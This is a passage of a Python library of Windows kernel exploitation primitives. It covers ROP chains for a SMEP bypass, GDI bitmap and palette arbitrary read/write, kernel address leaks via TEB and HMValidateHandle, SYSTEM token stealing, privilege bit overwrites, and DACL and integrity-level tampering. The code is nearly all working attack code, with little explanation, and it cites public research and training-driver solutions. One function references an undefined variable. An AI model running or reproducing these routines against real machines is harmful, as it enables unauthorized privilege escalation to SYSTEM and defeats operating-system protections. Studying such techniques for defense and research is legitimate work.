		rop += struct.pack("<Q", return_address)			# (return into shellcode)
	return rop

def set_user_pte_kernel_rop(hal_base, va_pte, return_address):
	"""
	This function creates a ROP chain to set a user address to be kernel address as described here:
	https://www.coresecurity.com/system/files/publications/2016/05/Windows%20SMEP%20bypass%20U%3DS.pdf
	@param hal_base: base address of the hal
	@param va_pte: the PTE address of the VA, that has to be changed from user space to kernel space
	@param return_address: address to return to after the ROP chain completes
	@return: ROP chain
	"""
	(pop_rcx_ret, pop_rax_ret, mov_byte_ptr_rax_cl_ret, wbinvd_ret) = get_smep_rop2_offsets()
	rop = struct.pack("<Q", hal_base + pop_rcx_ret)		# pop rcx; ret
	rop += struct.pack("<Q", 0x63)						# DIRTY + ACCESSED + R/W + PRESENT
	rop += struct.pack("<Q", hal_base + pop_rax_ret)		# pop rax; ret
	rop += struct.pack("<Q", va_pte)						# PTE address
	rop += struct.pack("<Q", hal_base + mov_byte_ptr_rax_cl_ret)		# mov byte ptr [rax], cl; ret
	rop += struct.pack("<Q", hal_base + wbinvd_ret)		# wbinvd; ret
	rop += struct.pack("<Q", return_address)				# The return address (in user space)
	return rop

def stack_pivot_from_kernel_to_user_rop():
	"""
	This function creates a ROP chain to stack pivot to user space from kernel space
	!!!!To be implemented
	@return: ROP chain
	"""
	rop = ''
	return rop

#########################################################################################
############This section contains kernel GDI object abusing related functions############
#########################################################################################


def create_bitmap(width, height, cBitsPerPel):
	"""
	This function will create a bitmap for write-what-where vulnerabilities with GDI abuse
	@param width: width of the bitmap
	@param height: height of the bitmap
	@param cBitsPerPel: bit ber cel 
	@return: the handle to the BITMAP object
	"""
	bitmap_handle = HBITMAP()

	bitmap_handle = gdi32.CreateBitmap(width, height, 1, cBitsPerPel, None)
	if bitmap_handle == None:
		print "[-] Error creating bitmap, exiting...."
		sys.exit(-1)
	print "[+] Bitmap handle: %s" % hex(bitmap_handle)
	return bitmap_handle

def create_bitmaps(width, height, cBitsPerPel):
	"""
	This function will create the worker and manager bitmap for write-what-where vulnerabilities with GDI abuse
	@param width: width of the bitmap
	@param height: height of the bitmap
	@param cBitsPerPel: bit ber cel 
	"""
	print "[*] Creating manager bitmap"
	manager_bitmap_handle = create_bitmap(width, height, cBitsPerPel)
	print "[*] Creating worker bitmap"
	worker_bitmap_handle = create_bitmap(width, height, cBitsPerPel)
	return (manager_bitmap_handle, worker_bitmap_handle)

def calculate_bitmap_size_parameters(s):
	"""
	This function will calculate the parameters to be used for bitmap allocation, if we know what is the size we need to allocate, height=1, cBitsPerPel=8
	@param s: size of the bitmap we need
	@return: (width, height, cBitsPerPel) tuple
	"""
	p = platform.platform()
	if p == 'Windows-10-10.0.10586':
		bmp_offset = 0x258
		min_size = 0x370
	elif p == 'Windows-10-10.0.14393':
		bmp_offset = 0x260
		min_size = 0x370
	elif p == 'Windows-10-10.0.15063':
		bmp_offset = 0x260
		min_size = 0x370
	elif p == 'Windows-8-6.2.9200-SP0':
		bmp_offset = 0x250
		min_size = 0x360
	elif p == 'Windows-8.1-6.3.9600':
		bmp_offset = 0x258
		min_size = 0x370
	elif p == 'Windows-7-6.1.7601-SP1':
		bmp_offset = 0x238
		min_size = 0x350
	
	if s < min_size:
		print "[-] Too small size, such Bitmap can't be allocated..."
		sys.exit(-1)
	elif s < 0x1000:
		print "[+] Bitmap will be allocated in the Paged session pool"
		width = s - bmp_offset - 0x10
	else:
		print "[+] Bitmap will be allocated in the Paged session pool / large pool"
		width = s - bmp_offset
	return (width, 1, 8)

def get_gdisharedhandletable():
	"""
	This function will return the GdiSharedHandleTable address of the current process
	"""
	process_basic_information = PROCESS_BASIC_INFORMATION()
	ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), ProcessBasicInformation, byref(process_basic_information), sizeof(process_basic_information), None)
	peb =  process_basic_information.PebBaseAddress.contents
	return peb.GdiSharedHandleTable

def get_pvscan0_address(bitmap_handle):
	"""
	Get the pvScan0 address, works up to Windows 10 v1511
	@param bitmap_handle: handle to the bitmap
	@return: the PVSCAN0 address in the kernel
	"""
	gdicell64_address = get_gdisharedhandletable() + (bitmap_handle & 0xFFFF) * sizeof(GDICELL64()) #the address is in user space
	gdicell64 = cast(gdicell64_address,POINTER(GDICELL64))
	pvscan0_address = gdicell64.contents.pKernelAddress + 0x50 #0x18 to SurfObj SURFOBJ64 -> 0x38 into SURFOBJ64 pvScan0 ULONG64
	return pvscan0_address

def set_address_bitmap(manager_bitmap, address):
	"""
	Sets the pvscan0 of the worker to the address we want to read/write later through the manager_bitmap
	@param manager_bitmap: handle to the manager bitmap
	@param address: the address to be set in worker bitmap's pvscan0 pointer
	"""
	address = c_ulonglong(address)
	gdi32.SetBitmapBits(manager_bitmap, sizeof(address), addressof(address));
	
def write_memory_bitmap(manager_bitmap, worker_bitmap, dst, src, len):
	"""
	Writes len number of bytes to the destination memory address from the source memory
	@param manager_bitmap: handle to the manager bitmap
	@param worker_bitmap: handle to the worker bitmap
	@param dst: destination to write to
	@param src: the source to copy from
	@param len: the amount to write
	"""
	set_address_bitmap(manager_bitmap, dst)
	gdi32.SetBitmapBits(worker_bitmap, len, src)
	
def read_memory_bitmap(manager_bitmap, worker_bitmap, src, dst, len):
	"""
	Reads len number of bytes to the destination memory address from the source memory
	@param manager_bitmap: handle to the manager bitmap
	@param worker_bitmap: handle to the worker bitmap
	@param dst: destination to copy to
	@param src: the source to read from
	@param len: the amount to read
	"""
	set_address_bitmap(manager_bitmap, src)
	gdi32.GetBitmapBits(worker_bitmap, len, dst)

def create_palette_with_size(s):
	"""
	Creates a palette with the size we want
	@param s: size of the palette
	@return: handle to the palette
	"""
	p = platform.platform()
	#from Windows v1607 onwards the PALETTE HEADER is smaller with 8 bytes
	if p == 'Windows-10-10.0.14393' or p == 'Windows-10-10.0.15063' or p == 'Windows-10-10.0.16299':
		palette_entries_offset = 0x88
	elif p == 'Windows-10-10.0.10586' or p == 'Windows-8-6.2.9200-SP0' or p == 'Windows-8.1-6.3.9600' or p == 'Windows-7-6.1.7601-SP1':
		palette_entries_offset = 0x90
	else:
		print "[-] This platform is not supported for palettes"
		sys.exit(-1)

	if s <= palette_entries_offset:
		print '[-] Bad plaette size! can\'t allocate palette of size < %s!' % hex(palette_entries_offset)
		sys.exit(-1)
	pal_cnt = (s - palette_entries_offset) / 4
	lPalette = LOGPALETTE()
	lPalette.palNumEntries = pal_cnt
	lPalette.palVersion = 0x300
	palette_handle = HANDLE()
	palette_handle = gdi32.CreatePalette(byref(lPalette))
	if palette_handle == None:
		print '[-] Couldn\'t create palette, exiting...'
		sys.exit(-1)
	return palette_handle

def set_address_palette(manager_platte_handle, address):
	"""
	Sets the pFirstColor of the worker to the address we want to read/write later through the manager palette
	@param manager_platte_handle: handle to the manager palette
	@param address: the address to be set in worker palette's pFirstColor pointer
	"""
	address = c_ulonglong(address)
	#we need to divide the len by 4 as the PALETTENTRY is 4 byte
	gdi32.SetPaletteEntries(manager_platte_handle, 0, sizeof(address)/4, addressof(address));
	
def write_memory_palette(manager_platte_handle, worker_platte_handle, dst, src, len):
	"""
	Writes len number of bytes to the destination memory address from the source memory
	@param manager_platte_handle: handle to the manager palette
	@param worker_platte_handle: handle to the worker palette
	@param dst: destination to write to
	@param src: the source to copy from
	@param len: the amount to write
	"""
	set_address_palette(manager_platte_handle, dst)
	#we need to divide the len by 4 as the PALETTENTRY is 4 byte
	gdi32.SetPaletteEntries(worker_platte_handle, 0, len/4, src)
	
def read_memory_palette(manager_platte_handle, worker_platte_handle, src, dst, len):
	"""
	Reads len number of bytes to the destination memory address from the source memory
	@param manager_platte_handle: handle to the manager bitmap
	@param worker_platte_handle: handle to the worker bitmap
	@param dst: destination to copy to
	@param src: the source to read from
	@param len: the amount to read
	"""
	set_address_palette(manager_platte_handle, src)
	#we need to divide the len by 4 as the PALETTENTRY is 4 byte
	gdi32.GetPaletteEntries(worker_platte_handle, 0, len/4, dst)

def leak_nt_base_palette(manager_palette, worker_palette):
	"""
	Function to leak the NT base via TEB
	Based on:
	https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Pointer-Leak.ps1
	and
	https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf
	@param manager_platte: handle to the manager palette
	@param worker_platte: handle to the worker palette
	@return: NT base
	"""
	print "[*] Leaking NT base via TEB and PALETTEs"
	teb = get_teb_base()
	Win32ThreadInfo_address = c_ulonglong()
	read_memory_palette(manager_palette, worker_palette, teb + 0x78, byref(Win32ThreadInfo_address), sizeof(Win32ThreadInfo_address))
	print "[+] Win32ThreadInfo_address: %s" % hex(Win32ThreadInfo_address.value)

	KTHREAD_address = c_ulonglong()
	read_memory_palette(manager_palette, worker_palette, Win32ThreadInfo_address.value, byref(KTHREAD_address), sizeof(KTHREAD_address))
	print "[+] KTHREAD address: %s " % hex(KTHREAD_address.value)
	
	pointer_into_nt = c_ulonglong()
	read_memory_palette(manager_palette, worker_palette, KTHREAD_address.value + 0x2a8, byref(pointer_into_nt), sizeof(pointer_into_nt))
	print "[+] Pointer into NT address: %s" % hex(pointer_into_nt.value)
	
	#search the MZ header backwards
	mz = 0x905a4d
	start_address = 0xFFFFFFFFFFFFF000 & pointer_into_nt.value
	while(True):
		data = c_uint()
		#check the first 4 bytes of the page if it's the MZ header
		read_memory_palette(manager_palette, worker_palette, start_address, byref(data), sizeof(data))
		if data.value == mz:
			print "[+] NT base address found: %s" % hex(start_address)
			return start_address
		else:
			start_address = start_address - 0x1000

def leak_haldispatchtable_palette(manager_palette, worker_palette):
	"""
	Function to leak the HalDispatchTable Address using PALETTEs
	@param manager_platte: handle to the manager palette
	@param worker_platte: handle to the worker palette
	@return: HalDispatchTable address
	"""
	print "[*] Locating HalDispatchTable base..."
 	if platform.architecture()[0] == '64bit':
		kernel32.LoadLibraryExA.restype = c_uint64
		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
		kernel32.GetProcAddress.restype = c_uint64
	krnlbase = leak_nt_base_palette(manager_palette, worker_palette)
	kernelver = ['ntoskrnl.exe','ntkrnlmp.exe','ntkrnlpa.exe','ntkrpamp.exe']
	for k in kernelver:
		print "[+] Loading %s in userland" % k
		hKernel = kernel32.LoadLibraryExA(k, 0, 1)
		if hKernel != 0:
			print "[+] %s base address : %s" % (k, hex(hKernel))
			break
	if hKernel == 0:
		print "[-] Couldn't load kernel, exiting..."
		sys.exit(-1)
	HalDispatchTable = kernel32.GetProcAddress(hKernel, 'HalDispatchTable')
	HalDispatchTable -= hKernel
	HalDispatchTable += krnlbase
	print "[+] HalDispatchTable address:", hex(HalDispatchTable)
	return HalDispatchTable

#original source: https://github.com/GradiusX/HEVD-Python-Solutions
def get_current_eprocess_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS):
	"""
	This function gets the kernel address of the current EPROCESS structure. It does it by going through the EPROCESS linked list.
	We need the bitmaps in order to read from memory.
	@param manager_bitmap: handle to the manager bitmap
	@param worker_bitmap: handle to the worker bitmap
	@param pointer_EPROCESS: pointer to an EPROCESS structure to start with (typically SYSTEM)
	@return: pointer to the current EPROCESS structure
	"""
	if platform.architecture()[0] == '64bit':
		#get OS EPROCESS structure constans values
		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
		flink = c_ulonglong()
		read_memory_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
		current_pointer_EPROCESS = 0
		while (1):
			unique_process_id = c_ulonglong(0)
			# Adjust EPROCESS pointer for next entry; flink.value is pointing to the next Flink so we need to subtract that offset
			pointer_EPROCESS = flink.value - EPROCESS_ActiveProcessLinks
			# Get PID; 
			read_memory_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_UniqueProcessId, byref(unique_process_id), sizeof(unique_process_id));	
			# Check if we're in the current process
			if (os.getpid() == unique_process_id.value):
				current_pointer_EPROCESS = pointer_EPROCESS
				break
			read_memory_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
			# If next same as last, we've reached the end
			if (pointer_EPROCESS == flink.value - EPROCESS_ActiveProcessLinks):
				break		
		return current_pointer_EPROCESS
	else:
		print "[-] Getting the current EPROCESS strcuture function is not prepared to work on x86, exiting..."
		sys.exit(-1)

def find_eprocess_by_pid_palette(manager_palette, worker_palette, pointer_EPROCESS, search_pid):
	"""
	This function gets the kernel address of the EPROCESS structure for the given PID. It does it by going through the EPROCESS linked list.
	We need the palettes in order to read from memory.
	@param manager_palette: handle to the manager palette
	@param worker_palette: handle to the worker palette
	@param pointer_EPROCESS: pointer to an EPROCESS structure to start with
	@param search_pid: The PID of the process which EPROCESS we look for
	@return: pointer to the current EPROCESS structure
	"""
	if platform.architecture()[0] == '64bit':
		#get OS EPROCESS structure constans values
		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
		flink = c_ulonglong()
		read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
		current_pointer_EPROCESS = 0
		while (1):
			unique_process_id = c_ulonglong(0)
			# Adjust EPROCESS pointer for next entry; flink.value is pointing to the next Flink so we need to subtract that offset
			pointer_EPROCESS = flink.value - EPROCESS_ActiveProcessLinks
			# Get PID; 
			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_UniqueProcessId, byref(unique_process_id), sizeof(unique_process_id));	
			# Check if we're in the current process
			if (search_pid == unique_process_id.value):
				current_pointer_EPROCESS = pointer_EPROCESS
				break
			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
			# If next same as last, we've reached the end
			if (pointer_EPROCESS == flink.value - EPROCESS_ActiveProcessLinks):
				break		
		return current_pointer_EPROCESS
	else:
		print "[-] Getting the current EPROCESS strcuture function is not prepared to work on x86, exiting..."
		sys.exit(-1)

def get_current_and_system_eprocess_palette(manager_palette, worker_palette):
	"""
	This function gets the kernel address of the current and SYSTEM EPROCESS structure
	We need the palettes in order to read from memory.
	@param manager_palette: handle to the manager palette
	@param worker_palette: handle to the worker palette
	@return: tuple of the memeory addresses to the EPROCESS structures
	"""
	if platform.architecture()[0] == '64bit':
		# Get SYSTEM EPROCESS
		try:
			print "[*] Trying with PsInitialSystemProcess"
			#try first running this in case process runs in medium integrity mode
			PsInitialSystemProcess = get_psinitialsystemprocess()
			system_EPROCESS = c_ulonglong()
			read_memory_palette(manager_palette, worker_palette, PsInitialSystemProcess, byref(system_EPROCESS), sizeof(system_EPROCESS));	
			system_EPROCESS = system_EPROCESS.value	
			print "[+] SYSTEM EPROCESS: %s" % hex(system_EPROCESS)
			# Get current EPROCESS
			current_EPROCESS = find_eprocess_by_pid_palette(manager_palette, worker_palette, system_EPROCESS, os.getpid())
			print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)
		except Exception, e:
			print "[-] Error: %s" % str(e)
			print "[*] Process possibly runs in low integrity, trying to leak address with tagWND structures"
			current_EPROCESS = leak_eprocess_address_palette(manager_palette, worker_palette)
			print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)
			system_EPROCESS = find_eprocess_by_pid_palette(manager_palette, worker_palette, current_EPROCESS, 4)
			print "[+] SYSTEM EPROCESS: %s" % hex(system_EPROCESS)
		return (current_EPROCESS, system_EPROCESS)
	else:
		print "[-] Getting the current and SYSTEM EPROCESS strcuture function is not prepared to work on x86, exiting..."
		sys.exit(-1)

def find_pid_and_eprocess_by_name_palette(manager_palette, worker_palette, pointer_EPROCESS, search_name):
	"""
	This function gets the PID of a process with the given name. It does it by going through the EPROCESS linked list with the help of PALETTE objects.
	We need the palettes in order to read from memory.
	@param manager_palette: handle to the manager palette
	@param worker_palette: handle to the worker palette
	@param pointer_EPROCESS: pointer to an EPROCESS structure to start with
	@param search_name: The process we look for
	@return: PID of the process and the EPROCESS address
	"""
	if platform.architecture()[0] == '64bit':
		#get OS EPROCESS structure constans values
		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
		flink = c_ulonglong()
		read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
		current_pointer_EPROCESS = 0
		while (1):
			unique_process_id = c_ulonglong(0)
			image_file_name = c_uint(0) #we will read the first 4 bytes to this
			# Adjust EPROCESS pointer for next entry; flink.value is pointing to the next Flink so we need to subtract that offset
			pointer_EPROCESS = flink.value - EPROCESS_ActiveProcessLinks
			# Get PID; 
			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_UniqueProcessId, byref(unique_process_id), sizeof(unique_process_id));	
			# Get Name; 
			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ImageFileName, byref(image_file_name), sizeof(image_file_name));
			current_name_4bytes = struct.pack("I",image_file_name.value).lower()
			# Check if we're in the current process
			if (current_name_4bytes == search_name[0:4]):
				break
			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
			# If next same as last, we've reached the end
			if (pointer_EPROCESS == flink.value - EPROCESS_ActiveProcessLinks):
				break
		print "[+] PID of %s is: %s" % (search_name, hex(unique_process_id.value))	
		print "[+] EPROCESS structure of %s is at: %s" % (search_name, hex(pointer_EPROCESS))	
		return (unique_process_id.value, pointer_EPROCESS)
	else:
		print "[-] Getting the current EPROCESS strcuture function is not prepared to work on x86, exiting..."
		sys.exit(-1)

def tokenstealing_with_bitmaps(manager_bitmap, worker_bitmap):
	"""
	This function perform tokenstealing with the help of bitmaps
	@param manager_bitmap: handle to the manager bitmap
	@param worker_bitmap: handle to the worker bitmap	
	"""
	if platform.architecture()[0] == '64bit':
		# Get SYSTEM EPROCESS
		PsInitialSystemProcess = get_psinitialsystemprocess()
		system_EPROCESS = c_ulonglong()
		read_memory_bitmap(manager_bitmap, worker_bitmap, PsInitialSystemProcess, byref(system_EPROCESS), sizeof(system_EPROCESS));	
		system_EPROCESS = system_EPROCESS.value	
		print "[+] SYSTEM EPROCESS: %s" % hex(system_EPROCESS)
	
		# Get current EPROCESS
		current_EPROCESS = get_current_eprocess_bitmap(manager_bitmap, worker_bitmap, system_EPROCESS)
		print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)

		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
		system_token = c_ulonglong()
		print "[+] Reading System TOKEN"
		read_memory_bitmap(manager_bitmap, worker_bitmap, system_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
		print "[+] Writing System TOKEN"
		write_memory_bitmap(manager_bitmap, worker_bitmap, current_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
	else:
		print "[-]Token stealing with bitmaps function is not prepared to work on x86, exiting..."
		sys.exit(-1)

def privilege_with_palettes(manager_palette, worker_palette):
	"""
	This function will give full privileges to the process, like described here: https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-3
	@param manager_palette: handle to the manager palette
	@param worker_palette: handle to the worker palette	
	"""
	print "[*] Giving full privileges to the process"
	if platform.architecture()[0] == '64bit':
		# Get SYSTEM EPROCESS
		(current_EPROCESS, system_EPROCESS) = get_current_and_system_eprocess_palette(manager_palette, worker_palette)

		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
		token = c_ulonglong()
		print "[+] Reading TOKEN address"
		read_memory_palette(manager_palette, worker_palette, current_EPROCESS + EPROCESS_Token, byref(token), sizeof(token));
		token_address = 0xFFFFFFFFFFFFFFF0 & token.value
		print "[+] Giving full privileges"
		full_priv = c_ulonglong(0xFFFFFFFFFFFFFFFF)
		write_memory_palette(manager_palette, worker_palette, token_address + 0x40, byref(full_priv), sizeof(full_priv)); #Present bits, has to be set on newer Win10 versions
		write_memory_palette(manager_palette, worker_palette, token_address + 0x48, byref(full_priv), sizeof(full_priv)); #Enabled bits
	else:
		print "[-]Giving full privileges to the process is not prepared to work on x86, exiting..."
		sys.exit(-1)

def acl_with_palettes(manager_palette, worker_palette, search_name):
	"""
	This function will give full privileges to the process, like described here: https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-4-there-is-no-code
	@param manager_palette: handle to the manager palette
	@param worker_palette: handle to the worker palette
	@param search_name: the process to look for
	"""
	print "[*] Setting ACL on %s" % search_name
	if platform.architecture()[0] == '64bit':
		# Get SYSTEM EPROCESS
		(current_EPROCESS, system_EPROCESS) = get_current_and_system_eprocess_palette(manager_palette, worker_palette)
		
		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
		
		(pid, pointer_EPROCESS) = find_pid_and_eprocess_by_name_palette(manager_palette, worker_palette, current_EPROCESS, search_name)
		
		#SecurityDescriptor is at -0x8 offset from EPROCESS, it's in the OBJECT_HEADER
		SecurityDescriptor_pointer = c_ulonglong(0)
		read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS - 0x8, byref(SecurityDescriptor_pointer), sizeof(SecurityDescriptor_pointer));
		SecurityDescriptor_address = SecurityDescriptor_pointer.value & 0xFFFFFFFFFFFFFFF0
		print "[*] SecurityDescriptor_address is at %s " % hex(SecurityDescriptor_address)
		DACL = c_ulonglong(0)
		read_memory_palette(manager_palette, worker_palette, SecurityDescriptor_address + 0x48, byref(DACL), sizeof(DACL));
		DACL_overwrite = c_ulonglong((DACL.value & 0xFFFFFFFFFFFFFF00) + 0xb)
		write_memory_palette(manager_palette, worker_palette, SecurityDescriptor_address + 0x48, byref(DACL_overwrite), sizeof(DACL_overwrite));

		token = c_ulonglong()
		print "[+] Reading TOKEN address"
		read_memory_palette(manager_palette, worker_palette, current_EPROCESS + EPROCESS_Token, byref(token), sizeof(token));
		token_address = 0xFFFFFFFFFFFFFFF0 & token.value
		integrity_level_settings = c_ulonglong(0)
		read_memory_palette(manager_palette, worker_palette, token_address + TOKEN_IntegrityLevelIndex, byref(integrity_level_settings), sizeof(integrity_level_settings));
		integrity_level_settings_overwrite = c_ulonglong(integrity_level_settings.value & 0xFFFFFF00FFFFFFFF)
		write_memory_palette(manager_palette, worker_palette, token_address + TOKEN_IntegrityLevelIndex, byref(integrity_level_settings_overwrite), sizeof(integrity_level_settings_overwrite));

	else:
		print "[-]Setting ACL is not prepared to work on x86, exiting..."
		sys.exit(-1)

def tokenstealing_with_palettes(manager_palette, worker_palette):
	"""
	This function perform tokenstealing with the help of palettes
	@param manager_palette: handle to the manager palette
	@param worker_palette: handle to the worker palette	
	"""
	if platform.architecture()[0] == '64bit':
		# Get SYSTEM EPROCESS
		(current_EPROCESS, system_EPROCESS) = get_current_and_system_eprocess_palette(manager_palette, worker_palette)

		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
		system_token = c_ulonglong()
		print "[+] Reading System TOKEN"
		read_memory_palette(manager_palette, worker_palette, system_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
		print "[+] Writing System TOKEN"
		write_memory_palette(manager_palette, worker_palette, current_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
	else:
		print "[-]Token stealing with palettes function is not prepared to work on x86, exiting..."
		sys.exit(-1)

def get_accel_kernel_address(handle):
	"""
	Returns kernel pointer of Accelerator Table given a Handle to it
	@param handle: handle
	@return: kernel pointer of Accelerator Table
	"""
	if platform.architecture()[0] == '64bit':
		gSharedInfo_address = kernel32.GetProcAddress(user32._handle,"gSharedInfo")
		handle_entry = cast (gSharedInfo_address + 0x8, POINTER(c_void_p))
		pHead_ptr_ptr = handle_entry.contents.value + (handle & 0xFFFF) * 0x18
		pHead_ptr = cast(pHead_ptr_ptr, POINTER(c_void_p))
	else:
		gSharedInfo_address = kernel32.GetProcAddress(user32._handle,"gSharedInfo")
		handle_entry = cast (gSharedInfo_address + 0x8, POINTER(c_void_p))
		pHead_ptr_ptr = handle_entry.contents.value + (handle & 0xFFFF) * 0xc
		pHead_ptr = cast(pHead_ptr_ptr, POINTER(c_void_p))
	return pHead_ptr.contents.value

def alloc_free_accelerator_tables():
	"""
	Allocates and Frees Accelerator Tables until last 2 addresses match
	@return kernel pointer to the accelarator table
	"""
	previous_kernel_address = 0
	while (1):
		accel_array = ACCEL_ARRAY()
		hAccel = user32.CreateAcceleratorTableA(addressof(accel_array), 675) # size = 0x1000
		kernel_address = get_accel_kernel_address(hAccel)
		user32.DestroyAcceleratorTable(hAccel)
		if previous_entry == kernel_address:
			print "[+] Duplicate AcceleratorTable: 0x%X" % kernel_address
			return kernel_address
		previous_kernel_address = kernel_address

#https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
def findHMValidateHandle():
	"""
	Searches for HMValidateHandle() function
	@return: pHMValidateHandle
	"""
	print "[*] Locating HMValidateHandle offset"	
	kernel32.LoadLibraryA.restype = HMODULE
	hUser32 = kernel32.LoadLibraryA("user32.dll")
	pIsMenu = kernel32.GetProcAddress(hUser32, "IsMenu")
	if pIsMenu == None:
		print "[-] Failed to find location of exported function 'IsMenu' within user32.dll..."
		sys.exit(-1)
	print "[+] user32.IsMenu: 0x%X" % pIsMenu
	pHMValidateHandle_offset = 0
	offset = 0
	while (offset < 0x1000):
		tempByte = cast(pIsMenu + offset, POINTER(c_ubyte))
		# if byte == 0xE8
		if tempByte.contents.value == 0xE8:
			pHMValidateHandle_offset = pIsMenu + offset + 1
			break
		offset = offset + 1
	if pHMValidateHandle_offset == 0:
		print "[-] Failed to find offset of HMValidateHandle from location of 'IsMenu'..."
		sys.exit(-1)
	print "[+] Pointer to HMValidateHandle offset: 0x%X" % pHMValidateHandle_offset
	HMValidateHandle_offset = (cast(pHMValidateHandle_offset, POINTER(c_long))).contents.value
	print "[+] HMValidateHandle offset: 0x%X" % HMValidateHandle_offset
	#Add 0xb because relative offset of call starts from next instruction after call, which is 0xb bytes from start of user32.IsMenu
	#The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHMValidateHandle = pIsMenu + HMValidateHandle_offset + 0xb
	print "[+] HMValidateHandle pointer: 0x%X" % pHMValidateHandle
	return pHMValidateHandle

def PyWndProcedure(hWnd, Msg, wParam, lParam):
	""" Callback Function for CreateWindow() """
	# if Msg == WM_DESTROY
	if Msg == 2:
		user32.PostQuitMessage(0)
	else:
		return user32.DefWindowProcW(hWnd, Msg, wParam, lParam)
	return 0

#source: https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1703/HEVD_arbitraryoverwrite.py
def allocate_free_window(classNumber, pHMValidateHandle):
	""" Allocate and Free a single Window """

	# Create prototype for HMValidateHandle()
	HMValidateHandleProto = WINFUNCTYPE (c_ulonglong, HWND, c_int)
	HMValidateHandle = HMValidateHandleProto(pHMValidateHandle)

	WndProc = WNDPROCTYPE(PyWndProcedure)
	hInst = kernel32.GetModuleHandleA(0)

	# instantiate WNDCLASSEX 
	wndClass = WNDCLASSEX()
	wndClass.cbSize = sizeof(WNDCLASSEX)
	wndClass.lpfnWndProc = WndProc
	wndClass.cbWndExtra = 0
	wndClass.hInstance = hInst
	wndClass.lpszMenuName = 'A' * 0x8f0 
	wndClass.lpszClassName = "Class_" + str(classNumber)

	# Register Class and Create Window
	hCls = user32.RegisterClassExW(byref(wndClass))
	hWnd = user32.CreateWindowExA(0,"Class_" + str(classNumber),'Franco',0xcf0000,0,0,300,300,0,0,hInst,0)
	p = platform.platform()
	if  p == 'Windows-10-10.0.15063':
		pcls = 0xa8
		lpszMenuNameOffset = 0x90
	elif p == 'Windows-10-10.0.16299':	
		pcls = 0xa8
		lpszMenuNameOffset = 0x98
	else:
		pcls = 0x98
		lpszMenuNameOffset = 0x88

	# Run HMValidateHandle on Window handle to get a copy of it in userland 
	pWnd = HMValidateHandle(hWnd,1)
	# Read pSelf from copied Window 
	kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value
	# Calculate ulClientDelta (tagWND.pSelf - HMValidateHandle()) 
	# pSelf = ptr to object in Kernel Desktop Heap; pWnd = ptr to object in User Desktop Heap 
	ulClientDelta = kernelpSelf - pWnd
	# Read tagCLS from copied Window 
	kernelTagCLS = (cast(pWnd+pcls, POINTER(c_ulonglong))).contents.value
	# Calculate user-land tagCLS location: tagCLS - ulClientDelta 
	userTagCLS = kernelTagCLS - ulClientDelta
	# Calculate kernel-land tagCLS.lpszMenuName 
	tagCLS_lpszMenuName = (cast (userTagCLS+lpszMenuNameOffset, POINTER(c_ulonglong))).contents.value
		
	# Destroy Window
	user32.DestroyWindow(hWnd)
	# Unregister Class
	user32.UnregisterClassW(c_wchar_p("Class_" + str(classNumber)), hInst)
		
	return tagCLS_lpszMenuName

